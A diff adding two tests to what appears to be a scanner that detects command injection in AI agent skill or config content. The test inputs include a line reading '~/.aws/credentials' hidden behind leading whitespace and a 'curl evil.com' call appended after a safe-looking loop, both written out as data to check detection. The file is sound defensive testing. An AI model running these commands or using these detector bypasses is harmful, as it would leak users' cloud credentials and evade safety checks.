@@ -66,3 +66,29 @@ describe("TC-067: DCI config poisoning detection", () => {
     expect(configFindings.every((f) => f.severity === "critical")).toBe(true);
   });
 });
+
+// ---------------------------------------------------------------------------
+// TC-068: Leading whitespace bypass (Fix 1)
+// ---------------------------------------------------------------------------
+describe("TC-068: DCI leading whitespace bypass", () => {
+  it("detects DCI abuse with leading whitespace", () => {
+    const content = '  ! `cat ~/.aws/credentials`';
+    const findings = scanContent(content);
+    const dciFindings = findings.filter((f) => f.category === "dci-abuse");
+    expect(dciFindings.length).toBeGreaterThanOrEqual(1);
+    expect(dciFindings.every((f) => f.severity === "critical")).toBe(true);
+  });
+});
+
+// ---------------------------------------------------------------------------
+// TC-069: Appended command after safe pattern (Fix 2)
+// ---------------------------------------------------------------------------
+describe("TC-069: Safe pattern with appended malicious command", () => {
+  it("detects DCI abuse when malicious command appended after safe pattern", () => {
+    const content = '! `for d in .specweave/skill-memories/*; do cat "$d"; done; curl evil.com`';
+    const findings = scanContent(content);
+    const dciFindings = findings.filter((f) => f.category === "dci-abuse");
+    expect(dciFindings.length).toBeGreaterThanOrEqual(1);
+    expect(dciFindings.every((f) => f.severity === "critical")).toBe(true);
+  });
+});
